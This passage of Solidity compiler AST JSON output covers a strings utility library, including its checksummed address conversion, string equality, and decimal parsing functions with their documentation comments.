memory"}},"functionReturnParameters":499,"id":555,"nodeType":"Return","src":"4315:21:3"}]},"documentation":{"id":493,"nodeType":"StructuredDocumentation","src":"3450:165:3","text":" @dev Converts an `address` with fixed length of 20 bytes to its checksummed ASCII `string` hexadecimal\n representation, according to EIP-55."},"id":557,"implemented":true,"kind":"function","modifiers":[],"name":"toChecksumHexString","nameLocation":"3629:19:3","nodeType":"FunctionDefinition","parameters":{"id":496,"nodeType":"ParameterList","parameters":[{"constant":false,"id":495,"mutability":"mutable","name":"addr","nameLocation":"3657:4:3","nodeType":"VariableDeclaration","scope":557,"src":"3649:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":494,"name":"address","nodeType":"ElementaryTypeName","src":"3649:7:3","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"3648:14:3"},"returnParameters":{"id":499,"nodeType":"ParameterList","parameters":[{"constant":false,"id":498,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":557,"src":"3686:13:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":497,"name":"string","nodeType":"ElementaryTypeName","src":"3686:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"3685:15:3"},"scope":1631,"src":"3620:723:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":593,"nodeType":"Block","src":"4498:104:3","statements":[{"expression":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":591,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":577,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"expression":{"arguments":[{"id":569,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":560,"src":"4521:1:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":568,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4515:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":567,"name":"bytes","nodeType":"ElementaryTypeName","src":"4515:5:3","typeDescriptions":{}}},"id":570,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4515:8:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":571,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"4524:6:3","memberName":"length","nodeType":"MemberAccess","src":"4515:15:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"expression":{"arguments":[{"id":574,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":562,"src":"4540:1:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":573,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4534:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":572,"name":"bytes","nodeType":"ElementaryTypeName","src":"4534:5:3","typeDescriptions":{}}},"id":575,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4534:8:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":576,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"4543:6:3","memberName":"length","nodeType":"MemberAccess","src":"4534:15:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"4515:34:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"&&","rightExpression":{"commonType":{"typeIdentifier":"t_bytes32","typeString":"bytes32"},"id":590,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"arguments":[{"arguments":[{"id":581,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":560,"src":"4569:1:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":580,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4563:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":579,"name":"bytes","nodeType":"ElementaryTypeName","src":"4563:5:3","typeDescriptions":{}}},"id":582,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4563:8:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"id":578,"name":"keccak256","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-8,"src":"4553:9:3","typeDescriptions":{"typeIdentifier":"t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$","typeString":"function (bytes memory) pure returns (bytes32)"}},"id":583,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4553:19:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"arguments":[{"arguments":[{"id":587,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":562,"src":"4592:1:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":586,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4586:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":585,"name":"bytes","nodeType":"ElementaryTypeName","src":"4586:5:3","typeDescriptions":{}}},"id":588,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4586:8:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}],"id":584,"name":"keccak256","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":-8,"src":"4576:9:3","typeDescriptions":{"typeIdentifier":"t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$","typeString":"function (bytes memory) pure returns (bytes32)"}},"id":589,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4576:19:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes32","typeString":"bytes32"}},"src":"4553:42:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"4515:80:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"functionReturnParameters":566,"id":592,"nodeType":"Return","src":"4508:87:3"}]},"documentation":{"id":558,"nodeType":"StructuredDocumentation","src":"4349:66:3","text":" @dev Returns true if the two strings are equal."},"id":594,"implemented":true,"kind":"function","modifiers":[],"name":"equal","nameLocation":"4429:5:3","nodeType":"FunctionDefinition","parameters":{"id":563,"nodeType":"ParameterList","parameters":[{"constant":false,"id":560,"mutability":"mutable","name":"a","nameLocation":"4449:1:3","nodeType":"VariableDeclaration","scope":594,"src":"4435:15:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":559,"name":"string","nodeType":"ElementaryTypeName","src":"4435:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"},{"constant":false,"id":562,"mutability":"mutable","name":"b","nameLocation":"4466:1:3","nodeType":"VariableDeclaration","scope":594,"src":"4452:15:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":561,"name":"string","nodeType":"ElementaryTypeName","src":"4452:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"4434:34:3"},"returnParameters":{"id":566,"nodeType":"ParameterList","parameters":[{"constant":false,"id":565,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":594,"src":"4492:4:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":564,"name":"bool","nodeType":"ElementaryTypeName","src":"4492:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"}],"src":"4491:6:3"},"scope":1631,"src":"4420:182:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":612,"nodeType":"Block","src":"4899:64:3","statements":[{"expression":{"arguments":[{"id":603,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":597,"src":"4926:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"hexValue":"30","id":604,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"4933:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},{"expression":{"arguments":[{"id":607,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":597,"src":"4942:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":606,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"4936:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":605,"name":"bytes","nodeType":"ElementaryTypeName","src":"4936:5:3","typeDescriptions":{}}},"id":608,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4936:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":609,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"4949:6:3","memberName":"length","nodeType":"MemberAccess","src":"4936:19:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":602,"name":"parseUint","nodeType":"Identifier","overloadedDeclarations":[613,644],"referencedDeclaration":644,"src":"4916:9:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_string_memory_ptr_$_t_uint256_$_t_uint256_$returns$_t_uint256_$","typeString":"function (string memory,uint256,uint256) pure returns (uint256)"}},"id":610,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"4916:40:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":601,"id":611,"nodeType":"Return","src":"4909:47:3"}]},"documentation":{"id":595,"nodeType":"StructuredDocumentation","src":"4608:214:3","text":" @dev Parse a decimal string and returns the value as a `uint256`.\n Requirements:\n - The string must be formatted as `[0-9]*`\n - The result must fit into an `uint256` type"},"id":613,"implemented":true,"kind":"function","modifiers":[],"name":"parseUint","nameLocation":"4836:9:3","nodeType":"FunctionDefinition","parameters":{"id":598,"nodeType":"ParameterList","parameters":[{"constant":false,"id":597,"mutability":"mutable","name":"input","nameLocation":"4860:5:3","nodeType":"VariableDeclaration","scope":613,"src":"4846:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":596,"name":"string","nodeType":"ElementaryTypeName","src":"4846:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"4845:21:3"},"returnParameters":{"id":601,"nodeType":"ParameterList","parameters":[{"constant":false,"id":600,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":613,"src":"4890:7:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":599,"name":"uint256","nodeType":"ElementaryTypeName","src":"4890:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"4889:9:3"},"scope":1631,"src":"4827:136:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":643,"nodeType":"Block","src":"5368:153:3","statements":[{"assignments":[626,628],"declarations":[{"constant":false,"id":626,"mutability":"mutable","name":"success","nameLocation":"5384:7:3","nodeType":"VariableDeclaration","scope":643,"src":"5379:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":625,"name":"bool","nodeType":"ElementaryTypeName","src":"5379:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":628,"mutability":"mutable","name":"value","nameLocation":"5401:5:3","nodeType":"VariableDeclaration","scope":643,"src":"5393:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":627,"name":"uint256","nodeType":"ElementaryTypeName","src":"5393:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":634,"initialValue":{"arguments":[{"id":630,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":616,"src":"5423:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"id":631,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":618,"src":"5430:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":632,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":620,"src":"5437:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":629,"name":"tryParseUint","nodeType":"Identifier","overloadedDeclarations":[665,702],"referencedDeclaration":702,"src":"5410:12:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_string_memory_ptr_$_t_uint256_$_t_uint256_$returns$_t_bool_$_t_uint256_$","typeString":"function (string memory,uint256,uint256) pure returns (bool,uint256)"}},"id":633,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5410:31:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_uint256_$","typeString":"tuple(bool,uint256)"}},"nodeType":"VariableDeclarationStatement","src":"5378:63:3"},{"condition":{"id":636,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"nodeType":"UnaryOperation","operator":"!","prefix":true,"src":"5455:8:3","subExpression":{"id":635,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":626,"src":"5456:7:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":640,"nodeType":"IfStatement","src":"5451:41:3","trueBody":{"errorCall":{"arguments":[],"expression":{"argumentTypes":[],"id":637,"name":"StringsInvalidChar","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":292,"src":"5472:18:3","typeDescriptions":{"typeIdentifier":"t_function_error_pure$__$returns$_t_error_$","typeString":"function () pure returns (error)"}},"id":638,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5472:20:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_error","typeString":"error"}},"id":639,"nodeType":"RevertStatement","src":"5465:27:3"}},{"expression":{"id":641,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":628,"src":"5509:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"functionReturnParameters":624,"id":642,"nodeType":"Return","src":"5502:12:3"}]},"documentation":{"id":614,"nodeType":"StructuredDocumentation","src":"4969:294:3","text":" @dev Variant of {parseUint-string} that parses a substring of `input` located between position `begin` (included) and\n `end` (excluded).\n Requirements:\n - The substring must be formatted as `[0-9]*`\n - The result must fit into an `uint256` type"},"id":644,"implemented":true,"kind":"function","modifiers":[],"name":"parseUint","nameLocation":"5277:9:3","nodeType":"FunctionDefinition","parameters":{"id":621,"nodeType":"ParameterList","parameters":[{"constant":false,"id":616,"mutability":"mutable","name":"input","nameLocation":"5301:5:3","nodeType":"VariableDeclaration","scope":644,"src":"5287:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":615,"name":"string","nodeType":"ElementaryTypeName","src":"5287:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"},{"constant":false,"id":618,"mutability":"mutable","name":"begin","nameLocation":"5316:5:3","nodeType":"VariableDeclaration","scope":644,"src":"5308:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":617,"name":"uint256","nodeType":"ElementaryTypeName","src":"5308:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":620,"mutability":"mutable","name":"end","nameLocation":"5331:3:3","nodeType":"VariableDeclaration","scope":644,"src":"5323:11:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":619,"name":"uint256","nodeType":"ElementaryTypeName","src":"5323:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"5286:49:3"},"returnParameters":{"id":624,"nodeType":"ParameterList","parameters":[{"constant":false,"id":623,"mutability":"mutable","name":"","nameLocation":"-1:-1:-1","nodeType":"VariableDeclaration","scope":644,"src":"5359:7:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":622,"name":"uint256","nodeType":"ElementaryTypeName","src":"5359:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"5358:9:3"},"scope":1631,"src":"5268:253:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":664,"nodeType":"Block","src":"5842:83:3","statements":[{"expression":{"arguments":[{"id":655,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":647,"src":"5888:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"hexValue":"30","id":656,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"5895:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},{"expression":{"arguments":[{"id":659,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":647,"src":"5904:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":658,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"5898:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":657,"name":"bytes","nodeType":"ElementaryTypeName","src":"5898:5:3","typeDescriptions":{}}},"id":660,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5898:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":661,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"5911:6:3","memberName":"length","nodeType":"MemberAccess","src":"5898:19:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":654,"name":"_tryParseUintUncheckedBounds","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":772,"src":"5859:28:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_string_memory_ptr_$_t_uint256_$_t_uint256_$returns$_t_bool_$_t_uint256_$","typeString":"function (string memory,uint256,uint256) pure returns (bool,uint256)"}},"id":662,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"5859:59:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_uint256_$","typeString":"tuple(bool,uint256)"}},"functionReturnParameters":653,"id":663,"nodeType":"Return","src":"5852:66:3"}]},"documentation":{"id":645,"nodeType":"StructuredDocumentation","src":"5527:215:3","text":" @dev Variant of {parseUint-string} that returns false if the parsing fails because of an invalid character.\n NOTE: This function will revert if the result does not fit in a `uint256`."},"id":665,"implemented":true,"kind":"function","modifiers":[],"name":"tryParseUint","nameLocation":"5756:12:3","nodeType":"FunctionDefinition","parameters":{"id":648,"nodeType":"ParameterList","parameters":[{"constant":false,"id":647,"mutability":"mutable","name":"input","nameLocation":"5783:5:3","nodeType":"VariableDeclaration","scope":665,"src":"5769:19:3","stateVariable":false,"storageLocation":"memory","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string"},"typeName":{"id":646,"name":"string","nodeType":"ElementaryTypeName","src":"5769:6:3","typeDescriptions":{"typeIdentifier":"t_string_storage_ptr","typeString":"string"}},"visibility":"internal"}],"src":"5768:21:3"},"returnParameters":{"id":653,"nodeType":"ParameterList","parameters":[{"constant":false,"id":650,"mutability":"mutable","name":"success","nameLocation":"5818:7:3","nodeType":"VariableDeclaration","scope":665,"src":"5813:12:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":649,"name":"bool","nodeType":"ElementaryTypeName","src":"5813:4:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":652,"mutability":"mutable","name":"value","nameLocation":"5835:5:3","nodeType":"VariableDeclaration","scope":665,"src":"5827:13:3","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":651,"name":"uint256","nodeType":"ElementaryTypeName","src":"5827:7:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"5812:29:3"},"scope":1631,"src":"5747:178:3","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":701,"nodeType":"Block","src":"6327:144:3","statements":[{"condition":{"commonType":{"typeIdentifier":"t_bool","typeString":"bool"},"id":689,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":685,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":679,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":672,"src":"6341:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"expression":{"arguments":[{"id":682,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":668,"src":"6353:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}],"id":681,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"6347:5:3","typeDescriptions":{"typeIdentifier":"t_type$_t_bytes_storage_ptr_$","typeString":"type(bytes storage pointer)"},"typeName":{"id":680,"name":"bytes","nodeType":"ElementaryTypeName","src":"6347:5:3","typeDescriptions":{}}},"id":683,"isConstant":false,"isLValue":false,"isPure":false,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"6347:12:3","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_bytes_memory_ptr","typeString":"bytes memory"}},"id":684,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"6360:6:3","memberName":"length","nodeType":"MemberAccess","src":"6347:19:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"6341:25:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"BinaryOperation","operator":"||","rightExpression":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":688,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":686,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":670,"src":"6370:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"id":687,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":672,"src":"6378:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"6370:11:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"6341:40:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":694,"nodeType":"IfStatement","src":"6337:63:3","trueBody":{"expression":{"components":[{"hexValue":"66616c7365","id":690,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"6391:5:3","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"false"},{"hexValue":"30","id":691,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"6398:1:3","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"id":692,"isConstant":false,"isInlineArray":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"TupleExpression","src":"6390:10:3","typeDescriptions":{"typeIdentifier":"t_tuple$_t_bool_$_t_rational_0_by_1_$","typeString":"tuple(bool,int_const 0)"}},"functionReturnParameters":678,"id":693,"nodeType":"Return","src":"6383:17:3"}},{"expression":{"arguments":[{"id":696,"name":"input","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":668,"src":"6446:5:3","typeDescriptions":{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"}},{"id":697,"name":"begin","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":670,"src":"6453:5:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"id":698,"name":"end","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":672,"src":"6460:3:3","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_string_memory_ptr","typeString":"string memory"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":695,"name":"_tryParseUintUncheckedBounds","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":772,"src":"6417:28:3","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_string_memory_ptr_$_t_uint256_$_t_uint256_$returns$_t_bool_$_t_uint256_$","typeString":"function (string memory,uint256,uint256) pure returns 